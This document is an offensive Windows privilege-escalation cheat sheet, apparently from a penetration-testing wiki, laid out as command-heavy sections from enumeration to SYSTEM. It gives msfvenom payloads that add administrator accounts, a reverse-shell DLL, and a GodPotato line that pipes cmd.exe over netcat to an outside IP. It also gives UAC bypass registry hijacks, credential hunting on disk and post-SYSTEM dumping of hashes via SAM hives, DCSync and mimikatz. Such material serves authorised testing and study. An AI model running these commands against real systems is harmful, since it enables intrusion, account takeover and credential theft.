# Windows Privilege Escalation — User → SYSTEM

## Table of Contents
1. [Enumeration & Triage](#enum)
2. [Token Privileges → Privesc routes](#tokens)
3. [Services (weak perms, unquoted, registry)](#services)
4. [AlwaysInstallElevated / MSI](#msi)
5. [Autorun & Startup hijack](#autorun)
6. [DLL Hijacking](#dll)
7. [Named Pipe / Potato family (SeImpersonate)](#potato)
8. [UAC Bypass (Medium → High)](#uac)
9. [Credential locations on disk/registry](#credlocations)
10. [WSUS, Veeam, KrbRelayUp, third-party](#thirdparty)
11. [Kernel / driver CVEs](#kernel)
12. [Tooling](#tools)

<a name="enum"></a>
## 1. Enumeration & Triage

```cmd
:: Best first step: WinPEAS (has Watson embedded)
winPEASx64.exe cmd searchfast
:: Alternates: PrivescCheck, Seatbelt, SharpUp, Watson, JAWS, metasploit local_exploit_suggester

whoami /all
whoami /priv                       :: token privileges = your route map
systeminfo                          :: OS + build
wmic qfe get Caption,Description,HotFixID,InstalledOn   :: patches → match KB gaps
wmic os get osarchitecture
net user
net localgroup administrators
net user %username%
```

Key patches to check for missing (classic kernel LPEs): MS16-032, PrintNightmare, etc. Cross-reference `systeminfo` with Watson/WES-ng.

```cmd
netstat -ano
tasklist /svc
schtasks /query /fo LIST /v
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```

<a name="tokens"></a>
## 2. Token Privileges → Route

Run `whoami /priv`. Map:
| Privilege | Route |
|---|---|
| SeImpersonatePrivilege / SeAssignPrimaryToken | Potato family (§7) |
| SeDebugPrivilege | Dump LSASS / token-copy SYSTEM (§credential-harvest) |
| SeBackupPrivilege | Read SAM/NTDS via robocopy /b, diskshadow (§credential-harvest) |
| SeRestorePrivilege | Replace service binaries / utilman |
| SeTakeOwnershipPrivilege | takeown + icacls /grant on service exe or SAM |
| SeLoadDriverPrivilege | BYOVD load vuln driver → kernel R/W |
| SeManageVolumePrivilege | volume maintenance write |
| SeTcbPrivilege | token manipulation |

Enable all token privs for testing: `EnableAllTokenPrivs.ps1`.

Token theft (High→SYSTEM) when SeDebug+SeImpersonate: OpenProcess + OpenProcessToken + DuplicateTokenEx + CreateProcessAsUser/WithToken on a SYSTEM process.

<a name="services"></a>
## 3. Services

```cmd
:: Find weak service binaries/paths (need accesschk or icacls)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv <service> /accepteula
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """
```
- **Weak binary/dir perms**: replace the service exe → `sc config <svc> binPath= ...` then `sc stop/start`.
- **Unquoted service path**: write exe into a writable intermediate path Windows tries first.
  `msfvenom -p windows/exec CMD="net localgroup administrators USER /add" -f exe-service -o svc.exe`
- **Weak registry**: `sc config` or `reg add HKLM\SYSTEM\CurrentControlSet\Services\<svc> /v ImagePath`.
- **AppendData/AddSubdirectory on service key** → create subkeys to execute.
- **Service recovery actions** → point to your binary.
- After escalation to High integrity: `sc create newservice binPath= "C:\path\payload.exe"` + `sc start`.

<a name="msi"></a>
## 4. AlwaysInstallElevated / MSI

Both `HKLM` and `HKCU` `...Installer\AlwaysInstallElevated = 0x1` → any user installs MSI as SYSTEM.
```cmd
msfvenom -p windows/adduser USER=hack PASS=Pass123! -f msi -o p.msi
msiexec /quiet /qn /i p.msi
:: or metasploit exploit/windows/local/always_install_elevated
```
MSI Wrapper / WIX / Visual Studio to wrap an arbitrary EXE payload.

<a name="autorun"></a>
## 5. Autorun & Startup Hijack

```cmd
:: List autoruns
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
:: + RunOnce, RunServices, RunOnceEx, Terminal Server Install keys, Active Setup Installed Components, IFEO
autorunsc.exe -m -nobanner -a * -ct /accepteula   :: Sysinternals full list
```
If a root/admin-run autorun binary or its folder is writable → replace with payload. Check `accesschk` on each path.

Other hijacks: Winlogon Userinit/Shell, AppInit_DLLs, scheduled tasks (schtasks run as SYSTEM), UserInitMprLogonScript, BHO, Font Drivers, htmlfile open command.

<a name="dll"></a>
## 6. DLL Hijacking

Find a SYSTEM service/app loading a DLL from a writable dir, or missing DLL (Procmon NAME NOT FOUND).
- Writable PATH folder DLL hijack.
- Known DLLs / side-loading. Craft DLL: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=... -f dll -o evil.dll`.
- `node_modules` C:\ hijack (Node/Electron bare import resolution) — plant C:\node_modules\<pkg>.js.

<a name="potato"></a>
## 7. Named Pipe / Potato Family (SeImpersonate)

Requirement: `SeImpersonatePrivilege` (common on IIS/MSSQL service accounts, NETWORK SERVICE).

| Tool | Target OS / note |
|---|---|
| JuicyPotato | older (Win7/2008–2016), needs CLSID |
| PrintSpoofer | Server2016/2019/Win10 — **try first** |
| RoguePotato | needs attacker redirector on :135 |
| SharpEfsPotato / EfsPotato | EfsRpc (MS-EFSR) |
| GodPotato | Server2022/Win11 — broad support |
| SigmaPotato | GodPotato fork, in-memory |
| DCOMPotato / McpManagementPotato | newer triggers |
| DeadPotato | 2024 rework (rev/newadmin/sharphound) |
| SweetPotato | base for many |

```cmd
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 10.10.14.2 4444"
```

Also: meterpreter `getsystem` (named pipe impersonation). From High integrity → SYSTEM via new service, named pipe, or token duplication.

<a name="uac"></a>
## 8. UAC Bypass (Medium → High, user in Administrators)

Confirm first:
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
powershell -c "[environment]::OSVersion.Version"
```
- If `EnableLUA=0` → no bypass needed, request elevation directly.
- **fodhelper.exe** registry hijack: set `HKCU\Software\Classes\ms-settings\Shell\Open\command` (default)=payload, `DelegateExecute`="", then run fodhelper.exe. Cleanup key after.
- **eventvwr / computerdefaults** (HKCU\Software\Classes\mscfile\shell\open\command).
- **SilentCleanup**: `reg add HKCU\Environment /v windir /d "cmd /c <payload>"` then `schtasks /run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"`, delete windir after.
- **COM ICMLuaUtil / CMSTPLUA** (fodhelper-family, UACME methods).
- **Token duplication**, **iscsicpl.exe** DLL hijack via HKCU\Environment\Path.
- Tool: **UACME** (Akagi) — pick method by build number; WinPwnage to scan.
- KRBUACBypass (Kerberos-based).
- Cobalt Strike: `elevate uac-token-duplication [listener]` / `runasadmin uac-cmstplua powershell ...`.

<a name="credlocations"></a>
## 9. Credential Locations (disk/registry)

See credential-harvest.md for LSASS/SAM/DPAPI. On-disk quick hits:
```cmd
type C:\Windows\System32\drivers\etc\hosts
cmdkey /list & runas /savecred /user:WORKGROUP\Administrator cmd
dir C:\Users\*\AppData\Local\Microsoft\Credentials\ /s /a:h
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
findstr /SI /M "password" *.xml *.ini *.txt *.config
:: unattend.xml / sysprep.xml / *.rdg / KeePass / browsers / wifi profiles:
netsh wlan show profile name="SSID" key=clear
:: GPP cPassword (MS14-025): gpp-decrypt <cpassword>
:: PowerShell history & transcripts:
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
Registry creds: Winlogon, SNMP, VNC, PuTTY sessions (SessionGopher). WSL: `wsl.exe` / bash.exe can run as distro user (check `wsl -l -v`, `--default-user root`).

<a name="thirdparty"></a>
## 10. WSUS / Veeam / KrbRelayUp / Third-party

- **WSUS** (`WUServer` http + `UseWUServer=1`): Wsuxploit / pyWSUS MiTM inject fake update; CVE-2020-1013 (WSUSpicious).
- **Veeam B&R CVE-2023-27532**: localhost TCP/9401 → SYSTEM (`VeeamHax.exe --cmd ...`).
- **KrbRelayUp**: domain, LDAP signing off + RBCD self-rights + machine-create → LPE (default settings).
- **Enterprise auto-updaters / privileged IPC** (Netskope/ASUS/MSI/Razer/Lenovo patterns): localhost HTTP/named-pipe IPC + weak signature check → SYSTEM MSI/exec. Triage:
  ```powershell
  Get-NetTCPConnection -State Listen | ? {$_.LocalAddress -in '127.0.0.1','::1'} | select LocalPort,OwningProcess
  [IO.Directory]::GetFiles("\\.\pipe\") | Select-String 'asus|msi|razer|agent|update'
  ```
- **Checkmk CVE-2024-0670**, Notepad++ plugin autoload, telephony tapsrv.

<a name="kernel"></a>
## 11. Kernel / Driver CVEs

Fallback after misconfig routes. Use Watson/`wesng` against `systeminfo`. Notable: PrintNightmare (LPE via spooler), various CVE kernel exploits. BYOVD (SeLoadDriver or admin) to load signed-vulnerable driver for kernel R/W → token steal. See wiki `arbitrary-kernel-rw-token-theft`, `windows-registry-hive-exploitation`.

<a name="tools"></a>
## 12. Tooling

WinPEAS, PrivescCheck, Seatbelt, SharpUp, Watson, JAWS, PowerUp (Invoke-AllChecks), accesschk, autorunsc, UACME, metasploit local_exploit_suggester, LaZagne. Static impacket: github.com/ropnop/impacket_static_binaries.

## Post-SYSTEM Windows harvesting (quick)
```cmd
reg save HKLM\sam sam.hiv & reg save HKLM\system system.hiv & reg save HKLM\security security.hiv
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
:: Domain: secretsdump.py -just-dc-ntlm DOMAIN/Admin@DC   (DCSync)
mimikatz "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
net user /domain  &  net group "Domain Admins" /domain
```
